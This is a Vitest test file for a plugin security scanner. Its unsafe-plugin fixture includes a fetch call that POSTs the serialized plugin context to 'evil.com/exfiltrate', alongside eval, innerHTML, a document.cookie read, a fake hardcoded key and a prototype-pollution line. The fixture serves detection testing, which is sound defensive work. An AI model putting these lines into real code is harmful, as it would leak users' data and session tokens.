import { describe, it, expect, beforeEach } from 'vitest';
import {
  SecurityScanner,
  createSecurityScanner,
  type PluginScanInput,
} from '../security-scanner.js';

const CLEAN_SOURCE = `
import { Plugin } from '@pocket/core';

export const myPlugin: Plugin = {
  name: 'my-plugin',
  version: '1.0.0',
  install(ctx) {
    ctx.hooks.beforeInsert(async (doc) => ({
      ...doc,
      updatedAt: Date.now(),
    }));
  },
};
`;

const UNSAFE_SOURCE = `
import { Plugin } from '@pocket/core';

export const myPlugin: Plugin = {
  name: 'unsafe-plugin',
  version: '1.0.0',
  install(ctx) {
    // dangerous: eval usage
    const result = eval('2 + 2');
    
    // dangerous: innerHTML
    document.getElementById('output').innerHTML = result;
    
    // dangerous: external fetch
    fetch('https://evil.com/exfiltrate', { method: 'POST', body: JSON.stringify(ctx) });
    
    // dangerous: cookie access
    const token = document.cookie;
    
    // dangerous: hardcoded secret
    const api_key = 'ABCDEFGHIJKLMNOPqrstuvwxyz123456789';
  },
};
`;

function createInput(sources: Record<string, string>, deps?: string[]): PluginScanInput {
  return {
    manifest: {
      name: '@pocket/test-plugin',
      version: '1.0.0',
      description: 'Test plugin',
      author: 'Test',
      category: 'data',
      pocketVersion: '>=0.1.0',
    },
    sourceFiles: new Map(Object.entries(sources)),
    dependencies: deps,
  };
}

describe('SecurityScanner', () => {
  let scanner: SecurityScanner;

  beforeEach(() => {
    scanner = createSecurityScanner();
  });

  describe('clean code', () => {
    it('should pass scan for clean code', () => {
      const result = scanner.scan(createInput({ 'src/index.ts': CLEAN_SOURCE }));
      expect(result.passed).toBe(true);
      expect(result.summary.critical).toBe(0);
      expect(result.summary.high).toBe(0);
    });

    it('should report scanned files and lines', () => {
      const result = scanner.scan(createInput({ 'src/index.ts': CLEAN_SOURCE }));
      expect(result.scannedFiles).toBe(1);
      expect(result.scannedLines).toBeGreaterThan(0);
    });
  });

  describe('vulnerability detection', () => {
    it('should detect eval usage', () => {
      const result = scanner.scan(createInput({ 'src/index.ts': UNSAFE_SOURCE }));
      const evalFinding = result.findings.find((f) => f.id.includes('eval-usage'));
      expect(evalFinding).toBeDefined();
      expect(evalFinding!.severity).toBe('critical');
      expect(evalFinding!.cweId).toBe('CWE-95');
    });

    it('should detect innerHTML usage', () => {
      const result = scanner.scan(createInput({ 'src/index.ts': UNSAFE_SOURCE }));
      const finding = result.findings.find((f) => f.id.includes('innerhtml'));
      expect(finding).toBeDefined();
      expect(finding!.severity).toBe('high');
    });

    it('should detect external fetch', () => {
      const result = scanner.scan(createInput({ 'src/index.ts': UNSAFE_SOURCE }));
      const finding = result.findings.find((f) => f.id.includes('fetch-external'));
      expect(finding).toBeDefined();
      expect(finding!.category).toBe('data-exfiltration');
    });

    it('should detect cookie access', () => {
      const result = scanner.scan(createInput({ 'src/index.ts': UNSAFE_SOURCE }));
      const finding = result.findings.find((f) => f.id.includes('document-cookie'));
      expect(finding).toBeDefined();
    });

    it('should detect hardcoded secrets', () => {
      const result = scanner.scan(createInput({ 'src/index.ts': UNSAFE_SOURCE }));
      const finding = result.findings.find((f) => f.id.includes('hardcoded-secret'));
      expect(finding).toBeDefined();
      expect(finding!.severity).toBe('critical');
    });

    it('should fail scan for unsafe code', () => {
      const result = scanner.scan(createInput({ 'src/index.ts': UNSAFE_SOURCE }));
      expect(result.passed).toBe(false);
      expect(result.summary.total).toBeGreaterThan(0);
    });

    it('should include file location in findings', () => {
      const result = scanner.scan(createInput({ 'src/bad.ts': UNSAFE_SOURCE }));
      const finding = result.findings[0]!;
      expect(finding.location?.file).toBe('src/bad.ts');
      expect(finding.location?.line).toBeGreaterThan(0);
    });
  });

  describe('prototype pollution detection', () => {
    it('should detect __proto__ usage', () => {
      const source = 'obj.__proto__.polluted = true;';
      const result = scanner.scan(createInput({ 'src/index.ts': source }));
      const finding = result.findings.find((f) => f.id.includes('prototype-pollution'));
      expect(finding).toBeDefined();
    });
  });

  describe('dependency scanning', () => {
    it('should flag risky dependencies', () => {
      const result = scanner.scan(
        createInput({ 'src/index.ts': CLEAN_SOURCE }, ['rxjs', 'axios', 'eval5']),
      );
      const depFindings = result.findings.filter((f) => f.category === 'dependency-risk');
      expect(depFindings.length).toBe(2); // axios + eval5
    });

    it('should not flag safe dependencies', () => {
      const result = scanner.scan(
        createInput({ 'src/index.ts': CLEAN_SOURCE }, ['rxjs', 'lodash']),
      );
      const depFindings = result.findings.filter((f) => f.category === 'dependency-risk');
      expect(depFindings).toHaveLength(0);
    });
  });

  describe('severity filtering', () => {
    it('should respect minSeverity filter', () => {
      const s = createSecurityScanner({ minSeverity: 'critical' });
      const result = s.scan(createInput({ 'src/index.ts': UNSAFE_SOURCE }));
      // Should only include critical findings
      expect(result.findings.every((f) => f.severity === 'critical')).toBe(true);
    });
  });

  describe('quickCheck', () => {
    it('should return true for clean code', () => {
      expect(scanner.quickCheck(createInput({ 'src/index.ts': CLEAN_SOURCE }))).toBe(true);
    });

    it('should return false for unsafe code', () => {
      expect(scanner.quickCheck(createInput({ 'src/index.ts': UNSAFE_SOURCE }))).toBe(false);
    });
  });

  describe('custom patterns', () => {
    it('should support adding custom patterns', () => {
      scanner.addPattern({
        id: 'custom-console',
        pattern: /console\.log/g,
        severity: 'low',
        category: 'resource-abuse',
        title: 'Console log detected',
        description: 'Remove console.log for production',
        recommendation: 'Use a proper logging library',
      });
      const source = 'console.log("debug");';
      const result = scanner.scan(createInput({ 'src/index.ts': source }));
      expect(result.findings.some((f) => f.id.includes('custom-console'))).toBe(true);
    });
  });

  describe('summary', () => {
    it('should correctly categorize findings by severity', () => {
      const result = scanner.scan(createInput({ 'src/index.ts': UNSAFE_SOURCE }));
      const { summary } = result;
      expect(summary.critical).toBeGreaterThan(0);
      expect(summary.high).toBeGreaterThan(0);
      expect(summary.total).toBe(
        summary.critical + summary.high + summary.medium + summary.low + summary.info,
      );
    });

    it('should sort findings by severity', () => {
      const result = scanner.scan(createInput({ 'src/index.ts': UNSAFE_SOURCE }));
      const severityOrder = { critical: 0, high: 1, medium: 2, low: 3, info: 4 };
      for (let i = 1; i < result.findings.length; i++) {
        const prev = severityOrder[result.findings[i - 1]!.severity];
        const curr = severityOrder[result.findings[i]!.severity];
        expect(prev).toBeLessThanOrEqual(curr);
      }
    });
  });
});
